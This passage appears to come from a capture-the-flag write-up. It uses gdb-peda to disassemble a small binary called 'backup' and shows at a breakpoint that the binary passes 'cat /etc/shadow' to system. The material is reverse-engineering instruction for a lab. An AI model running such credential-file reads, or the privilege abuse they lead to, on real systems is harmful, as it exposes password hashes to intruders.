I used `ltrace` to see that `backup` was calling `system`, but I could open it in `gdb` as well to see it. I’ll start `gdb` with the `backup` binary and `-q` so it doesn’t dump a bunch of extra text. Then I’ll disassemble the main function:

```

mitsos@LazyClown:~$ gdb -q backup 
Reading symbols from backup...(no debugging symbols found)...done.
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x0804841d <+0>:     push   ebp
   0x0804841e <+1>:     mov    ebp,esp
   0x08048420 <+3>:     and    esp,0xfffffff0
   0x08048423 <+6>:     sub    esp,0x10
   0x08048426 <+9>:     mov    DWORD PTR [esp],0x80484d0
   0x0804842d <+16>:    call   0x80482f0 <system@plt>
   0x08048432 <+21>:    mov    eax,0x0
   0x08048437 <+26>:    leave  
   0x08048438 <+27>:    ret    
End of assembler dump.

```

It clearly gets a string at +9 and loads it into ESP (the top of the stack, where args are passed in 32-bit). Then it calls `system`. I can put a break point at the call to `system`:

```

gdb-peda$ b *main+16
Breakpoint 1 at 0x804842d

```

Now I’ll enter `r` to run. It hits the break point and prints the current context:

```

[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0xb7fce000 --> 0x1abda8 
ECX: 0xb59b4f9e 
EDX: 0xbffff734 --> 0xb7fce000 --> 0x1abda8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6f0 --> 0x80484d0 ("cat /etc/shadow")
EIP: 0x804842d (<main+16>:      call   0x80482f0 <system@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048420 <main+3>:  and    esp,0xfffffff0
   0x8048423 <main+6>:  sub    esp,0x10
   0x8048426 <main+9>:  mov    DWORD PTR [esp],0x80484d0
=> 0x804842d <main+16>: call   0x80482f0 <system@plt>
   0x8048432 <main+21>: mov    eax,0x0
   0x8048437 <main+26>: leave  
   0x8048438 <main+27>: ret    
   0x8048439:   xchg   ax,ax
Guessed arguments:
arg[0]: 0x80484d0 ("cat /etc/shadow")
[------------------------------------stack-------------------------------------]
0000| 0xbffff6f0 --> 0x80484d0 ("cat /etc/shadow")
0004| 0xbffff6f4 --> 0xb7fff000 --> 0x20f30 
0008| 0xbffff6f8 --> 0x804844b (<__libc_csu_init+11>:   add    ebx,0x1bb5)
0012| 0xbffff6fc --> 0xb7fce000 --> 0x1abda8 
0016| 0xbffff700 --> 0x8048440 (<__libc_csu_init>:      push   ebp)
0020| 0xbffff704 --> 0x0 
0024| 0xbffff708 --> 0x0 
0028| 0xbffff70c --> 0xb7e3baf3 (<__libc_start_main+243>:       mov    DWORD PTR [esp],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804842d in main ()
gdb-peda$

```

The instruction pointer is at the call to `system` (marked by the `=>` in the `code` section). Just below there, the “Guessed arguments” show the string “cat /etc/shadow”.